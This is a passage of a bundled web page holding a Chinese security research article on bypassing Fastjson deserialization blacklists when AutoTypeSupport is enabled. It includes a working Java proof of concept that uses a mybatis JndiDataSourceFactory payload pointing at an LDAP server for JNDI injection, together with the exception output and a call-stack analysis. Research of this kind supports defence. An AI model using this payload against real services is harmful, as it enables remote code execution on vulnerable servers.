<code>1.2.45</code>​，运行上面的 poc 进行查看，报错 autoType is not support. [com.sun.rowset.JdbcRowSetImpl 调试看看。</p><p>​<img src="'+E+'" alt="image" loading="lazy">​</p><h3 id="绕过利用-2" tabindex="-1"><a class="header-anchor" href="#绕过利用-2"><span>绕过利用</span></a></h3><p>​<code>1.2.45</code>​ 这个版本之后修复了之前的关于字符串处理绕过黑名单的问题，这里是利用的是不存在黑名单中的类。</p>',40),Q=(0,s.Lk)("strong",null,"前提条件：",-1),V={href:"https://mvnrepository.com/artifact/org.mybatis/mybatis",target:"_blank",rel:"noopener noreferrer"},H=(0,s.Lk)("code",null,"3.x.x",-1),Z=(0,s.Lk)("s",null,[(0,s.eW)("​"),(0,s.Lk)("code",null,"<3.5.0"),(0,s.eW)("​")],-1),K=(0,s.Lk)("s",null,"的版本",-1),Y={href:"https://mvnrepository.com/artifact/org.mybatis/mybatis/3.5.16",target:"_blank",rel:"noopener noreferrer"},$=(0,s.Fv)('<p>添加依赖</p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt;</span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.0.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>\n\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>poc 如下</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>\n        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\\&quot;,\\&quot;properties\\&quot;:{\\&quot;data_source\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;}}\\n&quot;</span><span class="token punctuation">;</span>\n\n        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>实测，目前最新版的 mybatis 3.5.16 也可以触发。</p><p>​<img src="'+S+'" alt="image" loading="lazy">​</p><p>异常信息</p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code>Exception in thread &quot;main&quot; org.apache.ibatis.datasource.DataSourceException: There was an error configuring JndiDataSourceTransactionPool. Cause: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: EXP.Exploit cannot be cast to javax.naming.spi.ObjectFactory]; remaining name &#39;Exploit&#39;\n\tat org.apache.ibatis.datasource.jndi.JndiDataSourceFactory.setProperties(JndiDataSourceFactory.java:42)\n\tat com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JndiDataSourceFactory.deserialze(Unknown Source)\n\tat com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:267)\n\tat com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:384)\n\tat com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1356)\n\tat com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1322)\n\tat com.alibaba.fastjson.JSON.parse(JSON.java:152)\n\tat com.alibaba.fastjson.JSON.parse(JSON.java:162)\n\tat com.alibaba.fastjson.JSON.parse(JSON.java:131)\n\tat demo.JdbcRowSetImplPoc.main(JdbcRowSetImplPoc.java:14)\nCaused by: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: EXP.Exploit cannot be cast to javax.naming.spi.ObjectFactory]; remaining name &#39;Exploit&#39;\n\tat com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1092)\n\tat com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)\n\tat com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)\n\tat com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)\n\tat com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)\n\tat javax.naming.InitialContext.lookup(InitialContext.java:417)\n\tat org.apache.ibatis.datasource.jndi.JndiDataSourceFactory.setProperties(JndiDataSourceFactory.java:38)\n\t... 9 more\nCaused by: java.lang.ClassCastException: EXP.Exploit cannot be cast to javax.naming.spi.ObjectFactory\n\tat javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)\n\tat javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:189)\n\tat com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1085)\n\t... 15 more\nPicked up JAVA_TOOL_OPTIONS: -Dfile.encoding=UTF-8\n\nProcess finished with exit code 1\n\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="利用链分析" tabindex="-1"><a class="header-anchor" href="#利用链分析"><span>利用链分析</span></a></h3><p>由于 &quot;<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>​&quot; 不在黑名单中，因此能成功绕过 <code>checkAutoType()</code>​ 函数的检测，继续往下调试分析这条利用链的原理。</p><p>由于 payload 中设置了 <code>properties</code>​ 属性值，且 <code>JndiDataSourceFactory.setProperties()</code>​ 方法满足之前说的 Fastjson 会自动调用的 setter 方法的条件，因此可被利用来进行 Fastjson 反序列化漏洞的利用。</p><p>​<img src="'+q+'" alt="image" loading="lazy">​</p><p>通过 fastjson 设置 <code>public static final String DATA_SOURCE = &quot;data_source&quot;;</code>​ 后，就相当于 <code>DATA_SOURCE</code>​ 可控，之后就是由 JNDI 注入的流程了。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// 调用栈</span>\n<span class="token generics"><span class="token punctuation">&lt;</span>init<span class="token punctuation">&gt;</span></span><span class="token operator">:</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token class-name">Exploit</span>\nnewInstance0<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">NativeConstructorAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>\nnewInstance<span class="token operator">:</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token class-name">NativeConstructorAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>\nnewInstance<span class="token operator">:</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token class-name">DelegatingConstructorAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>\nnewInstance<span class="token operator">:</span><span class="token number">526</span><span class="token punctuation">,</span> <span class="token class-name">Constructor</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>\nnewInstance<span class="token operator">:</span><span class="token number">383</span><span class="token punctuation">,</span> <span class="token class-name">Class</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">)</span>\ngetObjectFactoryFromReference<span class="token operator">:</span><span class="token number">163</span><span class="token punctuation">,</span> <span class="token class-name">NamingManager</span> <span class="token punctuation">(</span>javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>\ngetObjectInstance<span class="token operator">:</span><span class="token number">188</span><span class="token punctuation">,</span> <span class="token class-name">DirectoryManager</span> <span class="token punctuation">(</span>javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>\nc_lookup<span class="token operator">:</span><span class="token number">1086</span><span class="token punctuation">,</span> <span class="token class-name">LdapCtx</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>ldap<span class="token punctuation">)</span>\np_lookup<span class="token operator">:</span><span class="token number">544</span><span class="token punctuation">,</span> <span class="token class-name">ComponentContext</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>toolkit<span class="token punctuation">.</span>ctx<span class="token punctuation">)</span>\nlookup<span class="token operator">:</span><span class="token number">177</span><span class="token punctuation">,</span> <span class="token class-name">PartialCompositeContext</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>toolkit<span class="token punctuation">.</span>ctx<span class="token punctuation">)</span>\nlookup<span class="token operator">:</span><span class="token number">203</span><span class="token punctuation">,</span> <span class="token class-name">GenericURLContext</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>toolkit<span class="token punctuation">.</span>url<span class="token punctuation">)</span>\nlookup<span class="token operator">:</span><span class="token number">94</span><span class="token punctuation">,</span> ldapURLContext <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>url<span class="token punctuation">.</span>ldap<span class="token punctuation">)</span>\nlookup<span class="token operator">:</span><span class="token number">411</span><span class="token punctuation">,</span> <span class="token class-name">InitialContext</span> <span class="token punctuation">(</span>javax<span class="token punctuation">.</span>naming<span class="token punctuation">)</span>\nsetProperties<span class="token operator">:</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token class-name">JndiDataSourceFactory</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>datasource<span class="token punctuation">.</span>jndi<span class="token punctuation">)</span>\ndeserialze<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">FastjsonASMDeserializer_1_JndiDataSourceFactory</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>\ndeserialze<span class="token operator">:</span><span class="token number">267</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>\nparseObject<span class="token operator">:</span><span class="token number">384</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">1356</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">1322</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">152</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">162</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">131</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>\nmain<span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token class-name">JdbcRowSetImplPoc</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="总结" tabindex="-1"><a class="header-anchor" href="#总结"><span>总结</span></a></h2><p>Fastjson 开启 AutoTypeSupport 的历史版本补丁的绕过大致就这些，后面就是讲 2019 年 Fastjson 反序列化漏洞，一样是 <code>checkAutoType()</code>​ 的绕过，但是无需开启 AutoTypeSupport。</p><h2 id="前人栽树" tabindex="-1"><a class="header-anchor" href="#前人栽树"><span>前人栽树</span></a></h2>',17),aa={href:"https://www.mi1k7ea.com/2019/11/10/Fastjson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94%E2%80%94%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87%EF%BC%88%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/",target:"_blank",rel:"noopener noreferrer"},ta={},na=(0,n(7708).A)(ta,[["render",function(a,t){const n=(0,s.g2)("ExternalLinkIcon");return(0,s.uX)(),(0,s.CE)("div",null,[A,(0,s.Lk)("p",null,[(0,s.eW)("再来看看从 1.2.42 引入的哈希黑名单，从 "),(0,s.Lk)("a",D,[(0,s.eW)("1.2.42"),(0,s.bF)(n)]),(0,s.eW)(" 版本开始，Fastjson 把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛。")]),F,(0,s.Lk)("p",null,[(0,s.eW)("已经有前人在 Github 上跑出了大部分黑名单包类，伟大无需多言："),(0,s.Lk)("a",J,[(0,s.eW)("LeadroyaL/fastjson-blacklist (github.com)"),(0,s.bF)(n)])]),O,(0,s.Lk)("p",null,[(0,s.eW)("​"),N,(0,s.eW)("​ 在 1.2.42 开始，把原本明文的黑名单改成了哈希过的黑名单，防止安全研究者对其进行研究。在 "),(0,s.Lk)("a",B,[(0,s.eW)("https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd"),(0,s.bF)(n)]),(0,s.eW)(" 这次 commit 中体现出来。")]),T,(0,s.Lk)("p",null,[(0,s.eW)("​"),z,(0,s.eW)("​ 在 1.2.61 开始，在 "),(0,s.Lk)("a",P,[(0,s.eW)("https://github.com/alibaba/fastjson/commit/d1c0dff9a33d49e6e7b98a4063da01bbc9325a38"),(0,s.bF)(n)]),(0,s.eW)(" 中，"),I,(0,s.eW)("，可能是为了防止安全研究者进行搜索，恕我直言有点可笑。")]),R,(0,s.Lk)("p",null,[(0,s.eW)("​"),_,(0,s.eW)("​ 在 1.2.62 开始，"),(0,s.Lk)("a",W,[(0,s.eW)("https://github.com/alibaba/fastjson/commit/014444e6c62329ec7878bb6b0c6b28c3f516c54e"),(0,s.bF)(n)]),(0,s.eW)(" 中，从小写改成了大写，可能是为了规范吧。")]),M,(0,s.Lk)("p",null,[(0,s.eW)("​"),U,(0,s.eW)(" ​在 1.2.67 开始，将内置白名单也使用哈希的方式存放。体现在这次 commit 中 "),(0,s.Lk)("a",G,[(0,s.eW)("https://github.com/alibaba/fastjson/commit/84eca8e56003ff6ebad3da19c6d69dcd842dbdf7"),(0,s.bF)(n)]),(0,s.eW)("，以下为对照表。")]),X,(0,s.Lk)("p",null,[Q,(0,s.eW)(" 需要目标服务端存在 "),(0,s.Lk)("a",V,[(0,s.eW)("mybatis"),(0,s.bF)(n)]),(0,s.eW)(" 的 jar 包，且版本需为 "),H,(0,s.eW)("​ 系列 "),Z,(0,s.eW)("​ "),K,(0,s.eW)("。（实测到截止本文最新版本 "),(0,s.Lk)("a",Y,[(0,s.eW)("3.5.16"),(0,s.bF)(n)]),(0,s.eW)(" 都可以触发）")]),$,(0,s.Lk)("ul",null,[(0,s.Lk)("li",null,[(0,s.Lk)("a",aa,[(0,s.eW)("Fastjson 系列三——历史版本补丁绕过（需开启 AutoType） [ Mi1k7ea ]"),(0,s.bF)(n)])])])])}]]),sa=JSON.parse('{"path":"/codereview/%E3%80%90JavaSec%E3%80%91%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20(%E2%85%A1).html","title":"fastjson 反序列化 (Ⅱ) - Need AutoTypeSupport = True","lang":"zh-CN","frontmatter":{"title":"fastjson 反序列化 (Ⅱ) - Need AutoTypeSupport = True","description":"历史版本补丁绕过，大前提​**都必须开启** **** AutoTypeSupport=true​。 在上文最后发现 1.2.24 之后的版本中，新增了 autoTypeSupport 反序列化选项，并使用 checkAutoType()​ 函数，通过黑白名单的方式来防御 Fastjson 反序列化漏洞，因此后面发现的 Fastjson 反序列化漏洞都...","head":[["meta",{"property":"og:url","content":"https://github.com/zha0cai/SecWikiPublic/secwiki/codereview/%E3%80%90JavaSec%E3%80%91%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20(%E2%85%A1).html"}],["meta",{"property":"og:site_name","content":"One-Piece"}],["meta",{"property":"og:title","content":"fastjson 反序列化 (Ⅱ) - Need AutoTypeSupport = True"}],["meta",{"property":"og:description","content":"历史版本补丁绕过，大前提​**都必须开启** **** AutoTypeSupport=true​。 在上文最后发现 1.2.24 之后的版本中，新增了 autoTypeSupport 反序列化选项，并使用 checkAutoType()​ 函数，通过黑白名单的方式来防御 Fastjson 反序列化漏洞，因此后面发现的 Fastjson 反序列化漏洞都..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2024-04-30T06:50:05.000Z"}],["meta",{"property":"article:author","content":"Mr.zha0cai"}],["meta",{"property":"article:modified_time","content":"2024-04-30T06:50:05.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"fastjson 反序列化 (Ⅱ) - Need AutoTypeSupport = True\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2024-04-30T06:50:05.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Mr.zha0cai\\",\\"url\\":\\"https://github.com/zha0cai\\"}]}"]]},"headers":[{"level":2,"title":"1.2.25 - 1.2.41 补丁绕过","slug":"_1-2-25-1-2-41-补丁绕过","link":"#_1-2-25-1-2-41-补丁绕过","children":[{"level":3,"title":"绕过利用（一）","slug":"绕过利用-一","link":"#绕过利用-一","children":[]},{"level":3,"title":"调试分析（一）","slug":"调试分析-一","link":"#调试分析-一","children":[]},{"level":3,"title":"绕过利用（二）","slug":"绕过利用-二","link":"#绕过利用-二","children":[]}]},{"level":2,"title":"1.2.25 - 1.2.42 补丁绕过","slug":"_1-2-25-1-2-42-补丁绕过","link":"#_1-2-25-1-2-42-补丁绕过","children":[{"level":3,"title":"调试分析","slug":"调试分析","link":"#调试分析","children":[]},{"level":3,"title":"绕过利用","slug":"绕过利用","link":"#绕过利用","children":[]},{"level":3,"title":"为什么在 1.2.42 之前也可以","slug":"为什么在-1-2-42-之前也可以","link":"#为什么在-1-2-42-之前也可以","children":[]}]},{"level":2,"title":"哈希黑名单","slug":"哈希黑名单","link":"#哈希黑名单","children":[{"level":3,"title":"背景","slug":"背景","link":"#背景","children":[]},{"level":3,"title":"目前已知的列表","slug":"目前已知的列表","link":"#目前已知的列表","children":[]},{"level":3,"title":"目前未知的列表","slug":"目前未知的列表","link":"#目前未知的列表","children":[]},{"level":3,"title":"内置白名单","slug":"内置白名单","link":"#内置白名单","children":[]}]},{"level":2,"title":"1.2.25 - 1.2.43 补丁绕过","slug":"_1-2-25-1-2-43-补丁绕过","link":"#_1-2-25-1-2-43-补丁绕过","children":[{"level":3,"title":"调试分析","slug":"调试分析-1","link":"#调试分析-1","children":[]},{"level":3,"title":"绕过利用","slug":"绕过利用-1","link":"#绕过利用-1","children":[]}]},{"level":2,"title":"1.2.25 - 1.2.45 补丁绕过","slug":"_1-2-25-1-2-45-补丁绕过","link":"#_1-2-25-1-2-45-补丁绕过","children":[{"level":3,"title":"调试分析","slug":"调试分析-2","link":"#调试分析-2","children":[]},{"level":3,"title":"绕过利用","slug":"绕过利用-2","link":"#绕过利用-2","children":[]},{"level":3,"title":"利用链分析","slug":"利用链分析","link":"#利用链分析","children":[]}]},{"level":2,"title":"总结","slug":"总结","link":"#总结","children":[]},{"level":2,"title":"前人栽树","slug":"前人栽树","link":"#前人栽树","children":[]}],"git":{"createdTime":1714459805000,"updatedTime":1714459805000,"contributors":[{"name":"zha0cai","email":"111300972+zha0cai@users.noreply.github.com","commits":1}]},"readingTime":{"minutes":10.37,"words":3112},"filePathRelative":"codereview/【JavaSec】漏洞分析/fastjson 反序列化 (Ⅱ).md","localizedDate":"2024年4月30日","autoDesc":true}')}}]);